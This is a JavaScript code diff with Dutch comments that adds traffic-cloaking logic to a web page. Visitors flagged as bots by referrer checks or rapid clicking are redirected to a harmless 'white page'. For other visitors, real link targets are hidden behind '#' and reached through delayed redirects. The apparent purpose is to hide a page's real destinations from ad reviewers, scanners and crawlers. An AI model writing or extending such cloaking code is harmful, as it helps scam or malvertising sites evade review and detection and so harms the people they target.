@@ -77,6 +77,13 @@
                 return true;
             }
 
+            // Controleer op aanwezigheid van een referer
+            const referer = document.referrer;
+            if (!referer || !referer.includes('your-website.com')) {
+                console.log("Invalid referer detected.");
+                return true;
+            }
+
             return false;
         }
 
@@ -141,6 +148,34 @@
             window.location.href = whitePage;
         }
 
+        // Functie: Cloak de werkelijke link door te verbergen in een tijdelijke link
+        function cloakLinks() {
+            const links = document.querySelectorAll('a');
+            links.forEach(link => {
+                const actualUrl = link.href;
+                link.href = '#'; // Verberg de werkelijke link
+                link.addEventListener('click', function(event) {
+                    setTimeout(() => {
+                        window.location.href = actualUrl; // Redirect na een korte vertraging
+                    }, 500); // Vertraging om bots te ontmoedigen
+                    event.preventDefault(); // Voorkom onmiddellijke redirect
+                });
+            });
+        }
+
+        // Functie: Check voor verdachte gedrag zoals te snelle klikken
+        let lastClickTime = 0;
+        function checkForRapidClicks() {
+            document.addEventListener('click', function() {
+                const currentTime = Date.now();
+                if (currentTime - lastClickTime < 500) {
+                    console.log('Rapid clicking detected.');
+                    redirectToWhitePage();
+                }
+                lastClickTime = currentTime;
+            });
+        }
+
         // Uitvoeren van logica bij het laden van de pagina
         document.addEventListener("DOMContentLoaded", () => {
             logUserAgentDetails(); // Roep de nieuwe functie aan
@@ -149,6 +184,8 @@
                 // Redirect naar de witte pagina voor bots
                 redirectToWhitePage();
             } else {
+                cloakLinks(); // Verberg de werkelijke links
+                checkForRapidClicks(); // Controleer op verdachte klikken
                 setTimeout(() => {
                     redirectBasedOnId(); // Prioriteit aan 'id'-gebaseerde redirect
                 }, 500); // Kleine vertraging om scraping te ontmoedigen
